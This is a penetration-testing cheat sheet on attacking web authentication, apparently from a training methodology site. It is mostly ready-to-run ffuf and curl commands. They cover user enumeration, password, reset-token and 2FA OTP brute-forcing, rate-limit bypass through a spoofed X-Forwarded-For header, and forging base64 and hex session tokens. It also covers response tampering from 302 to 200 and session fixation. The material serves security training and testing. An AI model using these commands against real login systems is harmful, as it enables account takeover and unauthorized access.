---
title: "Broken Authentication"
description: "Weak passwords, session hijacking, MFA bypass, and credential stuffing."
sidebar:
  order: 11
  label: "Broken Authentication"
---
> Attacks on authentication mechanisms: user enumeration, password/token/2FA brute-forcing, authentication bypass, and session attacks.

---


## User Enumeration

### Via Different Error Messages

```bash
# Ejemplo: "Unknown user" vs "Invalid credentials" → revela si el user existe

# ffuf: filtrar respuestas con el mensaje de "usuario inválido"
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
     -u http://TARGET/index.php \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=FUZZ&password=invalid" \
     -fr "Unknown user"

# Wordlists de usuarios
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

### Via Registration / Password Reset

```bash
# Si el registro dice "User already exists" → el user existe
# Si el password reset dice "Email sent to..." → el email existe

# ffuf en registro
ffuf -w usernames.txt \
     -u http://TARGET/register.php \
     -X POST \
     -d "username=FUZZ&email=test@test.com&password=Test1234!" \
     -fr "User already exists"
```

---

## Default Credentials

```bash
# Recursos para buscar default creds:
# - https://www.cirt.net/passwords
# - /usr/share/seclists/Passwords/Default-Credentials/
# - Google: "AppName default credentials"
# - GitHub del proyecto → README/INSTALL

# Ejemplos comunes
admin:admin
admin:password
admin:admin123
root:root
guest:guest
admin@admin.com:password    # BookStack
administrator:administrator

# ffuf con lista de pares user:pass (credential stuffing)
ffuf -w /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt \
     -u http://TARGET/login.php \
     -X POST \
     -d "username=FUZZ&password=FUZZ" \      # NOTA: requiere wordlist con user:pass separados
     -fr "Invalid"
```

---

## Password Brute-Forcing

### Filtering Wordlists by Password Policy

```bash
# Política: mínimo 10 chars, mayúsculas, minúsculas, dígito
grep ':upper:' /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt \
  | grep ':lower:' \
  | grep ':digit:' \
  | grep -E '.{10}' > custom_wordlist.txt

# Con awk (más eficiente)
awk 'length($0) >= 10 && /[a-z]/ && /[A-Z]/ && /[0-9]/' rockyou.txt > custom_wordlist.txt

# verificar reducción
wc -l custom_wordlist.txt
```

### ffuf Login Brute-Forcing

```bash
# Interceptar login con Burp primero para identificar params y error message

ffuf -w ./custom_wordlist.txt \
     -u http://TARGET/index.php \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=admin&password=FUZZ" \
     -fr "Invalid username"

# Si hay cookie de sesión necesaria:
ffuf -w wordlist.txt \
     -u http://TARGET/login.php \
     -X POST \
     -b "PHPSESSID=SESSION_COOKIE" \
     -d "username=admin&password=FUZZ" \
     -fr "Invalid password"
```

---

## Password Reset Token Brute-Forcing

```bash
# Generar wordlist de tokens numéricos (ej: token de 4 dígitos)
seq -w 0 9999 > tokens.txt    # genera 0000, 0001, ..., 9999

# Generar tokens de 6 dígitos
seq -w 0 999999 > tokens6.txt

# ffuf en endpoint de reset (token en GET param)
ffuf -w ./tokens.txt \
     -u "http://TARGET/reset_password.php?token=FUZZ" \
     -fr "The provided token is invalid"

# ffuf en endpoint de reset (token en POST param)
ffuf -w ./tokens.txt \
     -u http://TARGET/reset_password.php \
     -X POST \
     -d "token=FUZZ&new_password=NewPass1!" \
     -fr "Invalid token"
```

---

## 2FA Bypass (OTP Brute-Forcing)

```bash
# 1. Obtener credenciales válidas (o tenerlas via phishing)
# 2. Hacer login → web pide OTP/2FA
# 3. Interceptar la petición con Burp para ver:
#    - El endpoint (/2fa.php, /verify.php, etc.)
#    - El nombre del parámetro del OTP
#    - La cookie de sesión necesaria

# Generar tokens de 4 dígitos
seq -w 0 9999 > tokens.txt

# ffuf brute-force del OTP (la cookie PHPSESSID vincula el OTP a la sesión autenticada)
ffuf -w ./tokens.txt \
     -u http://TARGET/2fa.php \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" \
     -d "otp=FUZZ" \
     -fr "Invalid 2FA Code"

# Una vez encontrado el OTP correcto → la sesión queda autenticada → acceder a /admin.php
```

> **Note:** After finding the valid OTP, the server marks the session as "fully authenticated". All subsequent requests with that cookie will have full access.

---

## Rate Limit Bypass

```bash
# Si el rate limit usa X-Forwarded-For para identificar la IP → spoofear header

# ffuf con X-Forwarded-For aleatorio por request
ffuf -w wordlist.txt \
     -u http://TARGET/login.php \
     -X POST \
     -d "username=admin&password=FUZZ" \
     -H "X-Forwarded-For: FUZZ" \   # FUZZ en el header también requiere wordlist de IPs
     -fr "Invalid"

# Alternativa: generar lista de IPs y combinar con -H
for i in {1..100}; do echo "1.2.3.$i"; done > ips.txt

# También probar otros headers de IP:
# X-Real-IP: RANDOM_IP
# True-Client-IP: RANDOM_IP
# X-Client-IP: RANDOM_IP

# ffuf con múltiples keywords (requires -w para cada FUZZ diferente)
ffuf -w wordlist.txt:FUZZ -w ips.txt:IP \
     -u http://TARGET/login.php \
     -X POST \
     -H "X-Forwarded-For: IP" \
     -d "username=admin&password=FUZZ" \
     -fr "Invalid"
```

---

## Password Reset — Logic Bugs

### Predictable Security Questions

```bash
# Crear wordlist de ciudades
wget https://raw.githubusercontent.com/datasets/world-cities/master/data/world-cities.csv
cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt

# Filtrar por país si hay contexto OSINT
cat world-cities.csv | grep "Germany" | cut -d ',' -f1 > german_cities.txt

# ffuf de security question
ffuf -w ./city_wordlist.txt \
     -u http://TARGET/security_question.php \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -b "PHPSESSID=SESSION_COOKIE" \
     -d "security_response=FUZZ" \
     -fr "Incorrect response"
```

### Username Parameter Manipulation in Password Reset

```bash
# Interceptar con Burp la petición final de reset de password
# POST /reset_password.php
# Body: password=NewPass&username=htb-stdnt

# Cambiar username al target admin
POST /reset_password.php HTTP/1.1
Cookie: PHPSESSID=abc123

password=P@$$w0rd&username=admin    # cambiar aquí el username
```

---

## Direct Auth Bypass

### Direct Access to Protected Pages

```bash
# Si la app usa redirect sin exit:
# PHP: header("Location: index.php"); sin exit → el body se devuelve igual

# 1. Intentar acceder directamente
curl -s http://TARGET/admin.php
# Respuesta: 302 con body de admin en HTML → cambiar código en Burp

# En Burp:
# Intercept Response → cambiar "302 Found" → "200 OK"
# Eliminar el header "Location:" de la respuesta
```

### Auth Parameter Modification

```bash
# La app usa ?user_id= para determinar quién accede
# Si /admin.php sin user_id → redirect al login
# Si /admin.php?user_id=183 → funciona sin cookie válida

# Brute-force del user_id admin
ffuf -w /usr/share/seclists/Fuzzing/Integers/Integers-Medium.txt \
     -u "http://TARGET/admin.php?user_id=FUZZ" \
     -fr "Could not load admin data"

# Acceder como admin
curl http://TARGET/admin.php?user_id=1
```

---

## Session Token Attacks

### Identifying Weak Tokens

```bash
# Hacer varios logins y capturar las cookies de sesión
# Buscar patrones: prefijo/sufijo estático, incremento, base64

# Analizar si es base64
echo -n "dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy" | base64 -d

# Analizar si es hex
echo "757365723d6874622d73746d6e743b726f6c653d75736572" | xxd -p -r
```

### Forging a Base64-Based Session Token

```bash
# Decodificar token existente
echo -n "TOKEN_BASE64" | base64 -d

# Modificar el rol y re-encodear
echo -n 'user=htb-stdnt;role=admin' | base64

# Usar el token forjado
curl -b "session=dXNlcj1odGItc3RkbnQ7cm9sZT1hZG1pbg==" http://TARGET/admin.php
```

### Forging a Hex-Based Session Token

```bash
# Decodificar token hex
echo "757365723d..." | xxd -p -r

# Modificar y re-encodear
echo -n 'user=htb-stdnt;role=admin' | xxd -p

curl -b "session=757365723d6874622d7374646e743b726f6c653d61646d696e" http://TARGET/admin.php
```

### Brute-Forcing Weak Tokens

```bash
# Token de 4 chars hex → 65536 posibilidades (16^4)
# Generar wordlist hex
python3 -c "
for i in range(65536):
    print(format(i, '04x'))
" > hex_tokens.txt

# ffuf de session token
ffuf -w ./hex_tokens.txt \
     -u http://TARGET/admin.php \
     -b "session=FUZZ" \
     -fr "Access Denied" \
     -mc 200
```

### Session Fixation

```bash
# 1. Obtener un session token válido (no hace falta estar autenticado)
curl -c session.txt http://TARGET/

# 2. Enviar al víctima una URL con el token conocido
# http://TARGET/?sid=NUESTRO_TOKEN

# 3. Esperar a que el víctima se autentique con ese token
# 4. Usar nuestro token → acceso a la sesión del víctima
curl -b "session=NUESTRO_TOKEN" http://TARGET/admin.php
```

---

## Authentication Testing Checklist

```
[ ] Test default credentials (admin:admin, admin:password, etc.)
[ ] Enumerate users (different error messages on login, registration, reset)
[ ] Review password policy → generate filtered wordlist
[ ] Brute-force with filtered wordlist + ffuf
[ ] Analyze reset token → is it a short number? predictable?
[ ] Intercept reset flow → is there a username parameter in the final request?
[ ] Security questions → search with city/name wordlists
[ ] 2FA with short OTP → brute-force with session cookie
[ ] Test X-Forwarded-For for rate limit bypass
[ ] Access /admin.php, /dashboard.php, /panel.php directly
[ ] If redirecting → intercept response in Burp → change 302 to 200
[ ] Search for auth parameters in URL (?user_id=, ?admin=true, ?role=user)
[ ] Capture multiple session tokens → analyze patterns
[ ] Decode session token (base64, hex) → modify role → re-encode
[ ] Verify session timeout (session invalid after closing browser?)
```

---

## Pitfalls / Gotchas

- **Identical error message does not rule out enumeration:** measure response time — the server might take longer querying the database for valid users.
- **Session cookie in ffuf for 2FA:** forgetting the `-b` flag causes all requests to be treated as unauthenticated → you will never find the correct OTP.
- **IP rate limit vs X-Forwarded-For:** test first without bypass, then with a changing `X-Forwarded-For: 1.1.1.1`. Some servers ignore this header.
- **Reset token with padding:** when fuzzing numeric tokens, `seq -w` ensures that `7` is sent as `0007`. Without padding, valid tokens with leading zeros will be missed.
- **302 without exit in PHP = exposed body:** even if the browser redirects, the protected body travels in the HTTP response. curl shows it; Burp allows intercepting it.
- **username in hidden parameter:** inspect all parameters in the reset request — including hidden fields. Always intercept with Burp, do not just look at the form.
- **Base64 token with `==` padding:** if the modified token contains `=` or `==` at the end after re-encoding, make sure the cookie includes it (URL-encode if necessary: `%3D%3D`).
- **Session Fixation requires the app to not regenerate the token on login:** check if `Set-Cookie` appears in the response upon logging in.

---

## Related Cheatsheets

- [Web Requests](/en/metodologias/fundamentos/web-requests/) — HTTP, cookies, basic authentication
- [Web Fuzzing](/en/metodologias/recon/web-fuzzing/) — ffuf, wordlists, filters
- [API Attacks](/en/metodologias/web/api-attacks/) — auth bypass in REST APIs
- [Server-side Attacks](/en/metodologias/web/server-side-attacks/) — SSRF, SSTI that can reveal tokens
